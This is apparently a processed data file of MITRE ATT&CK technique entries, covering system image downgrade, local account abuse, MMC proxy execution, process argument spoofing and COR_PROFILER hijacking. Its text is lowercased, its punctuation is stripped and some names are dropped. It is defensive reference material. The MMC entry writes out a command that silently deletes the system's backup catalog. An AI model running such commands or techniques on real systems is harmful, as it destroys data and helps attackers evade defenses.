attack-pattern--fc74ba38-dc98-461f-8611-b3dbf9978e3d,['enterprise-attack'],['T1601.002'],Downgrade System Image,adversaries may install an older version of the operating system of a network device to weaken security   older operating system versions on network devices often have weaker encryption ciphers and  in general  fewer less updated defensive features   citation  cisco synful knock evolution   on embedded devices  downgrading the version typically only requires replacing the operating system file in storage   with most embedded devices  this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart   the adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts_  downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as  weaken   downgrading of a system image can be done on its own  or it can be used in conjunction with  patch system
attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2,['enterprise-attack'],['T1078.003'],Local Accounts,adversaries may obtain and abuse credentials of a local account as a means of gaining initial access  persistence  privilege escalation  or defense evasion  local accounts are those configured by an organization for use by users  remote support  services  or for administration on a single system or service_  local accounts may also be abused to elevate privileges and harvest credentials through  os credential  password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of privilege escalation and lateral movement 
attack-pattern--fe926152-f431-4baf-956c-4ad3cb0bf23b,['enterprise-attack'],['T1211'],Exploitation for Defense Evasion,adversaries may exploit a system or application vulnerability to bypass security features  exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program  service  or within the operating system software or kernel itself to execute adversary controlled code_ vulnerabilities may exist in defensive security software that can be used to disable or circumvent them_  adversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for  security software  the security software will likely be targeted directly for exploitation  there are examples of antivirus software being targeted by persistent threat groups to avoid detection 
attack-pattern--ff25900d-76d5-449b-a351-8824e62fc81b,['enterprise-attack'],['T1127'],Trusted Developer Utilities Proxy Execution,adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads  there are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development  debugging  and reverse engineering_ citation  engima x  dnx bypass  citation  engima x  rcsi bypass  citation  exploit monday windbg  citation  lolbas tracker  these utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions 
attack-pattern--ff73aa03-0090-4464-83ac-f89e233c02bc,['enterprise-attack'],['T1529'],System Shutdown/Reboot,adversaries may shutdown reboot systems to interrupt access to  or aid in the destruction of  those systems  operating systems may contain commands to initiate a shutdown reboot of a machine or network device  in some cases  these commands may also be used to initiate a shutdown reboot of a remote computer or network device via  network device   e_g  reload _ citation  microsoft shutdown oct       shutting down or rebooting systems may disrupt access to computer resources for legitimate users_  adversaries may attempt to shutdown reboot a system after impacting it in other ways  such as  disk structure  or  inhibit system  to hasten the intended effects on system availability_ citation  talos nyetya june       citation  talos olympic destroyer      
attack-pattern--ffbcfdb0-de22-4106-9ed3-fc23c8a01407,['enterprise-attack'],['T1218.014'],MMC,adversaries may abuse mmc_exe to proxy execution of malicious _msc files  microsoft management console  mmc  is a binary that may be signed by microsoft and is used in several ways in either its gui or in a command prompt  mmc can be used to create  open  and save custom consoles that contain administrative tools created by microsoft  called snap ins  these snap ins may be used to manage windows systems locally or remotely  mmc can also be used to open microsoft created _msc files to manage system configuration_  for example  mmc c  users foo admintools_msc  a will open a custom  saved console msc file in author mode  another common example is mmc gpedit_msc  which will open the group policy editor application window    adversaries may use mmc commands to perform malicious tasks  for example  mmc wbadmin_msc delete catalog  quiet deletes the backup catalog on the system  i_e   inhibit system  without prompts to the user  note  wbadmin_msc may only be present by default on windows server operating systems _  adversaries may also abuse mmc to execute malicious _msc files  for example  adversaries may first create a malicious registry class identifier  clsid  subkey  which uniquely identifies a  component object  class object  then  adversaries may create custom consoles with the  link to web address  snap in that is linked to the malicious clsid subkey  once the _msc file is saved  adversaries may invoke the malicious clsid payload with the following command  mmc_exe  embedding c  path to test_msc 
attack-pattern--ffe59ad3-ad9b-4b9f-b74f-5beb3c309dc1,['enterprise-attack'],['T1564.010'],Process Argument Spoofing,adversaries may attempt to hide process command line arguments by overwriting process memory  process command line arguments are stored in the process environment block  peb   a data structure used by windows to store various information about used by a process  the peb includes the process command line arguments that are referenced when executing the process  when a process is created  defensive tools sensors that monitor process creations may retrieve the process arguments from the peb_ citation  microsoft peb       citation  xpn argue like cobalt        adversaries may manipulate a process peb to evade defenses  for example   process  can be abused to spawn a process in a suspended state with benign arguments  after the process is spawned and the peb is initialized  and process information is potentially logged by tools sensors   adversaries may override the peb to modify the command line arguments  ex  using the  native  writeprocessmemory   function  then resume process execution with malicious arguments_ citation  cobalt strike arguments       citation  xpn argue like cobalt       citation  nviso spoof command line        adversaries may also execute a process with malicious command line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis_ citation  fireeye fivehands april        this behavior may also be combined with other tricks  such as  parent pid  to manipulate or further evade process based detections 
attack-pattern--ffe742ed-9100-4686-9e00-c331da544787,['enterprise-attack'],['T1077'],Windows Admin Shares,windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions  example network shares include c   admin   and ipc     adversaries may use this technique in conjunction with administrator level  valid  to remotely access a networked system over server message block  smb   citation  wikipedia smb  to interact with systems using remote procedure calls  rpcs    citation  technet rpc  transfer files  and run transferred binaries through remote execution  example execution techniques that rely on authenticated sessions over smb rpc are  scheduled   service  and  windows management  adversaries can also use ntlm hashes to access administrator shares on systems with  pass the  and certain configuration and patch levels   citation  microsoft admin shares   the  utility can be used to connect to windows admin shares on remote systems using net use commands with valid credentials   citation  technet net use 
attack-pattern--ffeb0780-356e-4261-b036-cfb6bd234335,['enterprise-attack'],['T1574.012'],COR_PROFILER,adversaries may leverage the cor_profiler environment variable to hijack the execution flow of programs that load the _net clr  the cor_profiler is a _net framework feature which allows developers to specify an unmanaged  or external of _net  profiling dll to be loaded into each _net process that loads the common language runtime  clr   these profilers are designed to monitor  troubleshoot  and debug managed code executed by the _net clr_ citation  microsoft profiling mar       citation  microsoft cor_profiler feb        the cor_profiler environment variable can be set at various scopes  system  user  or process  resulting in different levels of influence  system and user wide environment variable scopes are specified in the registry  where a  component object   com  object can be registered as a profiler dll  a process scope cor_profiler can also be created in memory without modifying the registry  starting with _net framework    the profiling dll does not need to be registered as long as the location of the dll is specified in the cor_profiler_path environment variable_ citation  microsoft cor_profiler feb        adversaries may abuse cor_profiler to establish persistence that executes a malicious dll in the context of all _net processes every time the clr is invoked  the cor_profiler can also be used to elevate privileges  ex   bypass user account  if the victim _net process executes at a higher permission level  as well as to hook and  impair  provided by _net processes_ citation  redcanary mockingbird may       citation  red canary cor_profiler may       citation  almond cor_profiler apr       citation  github omerya invisi shell  citation  subtee _net profilers may      
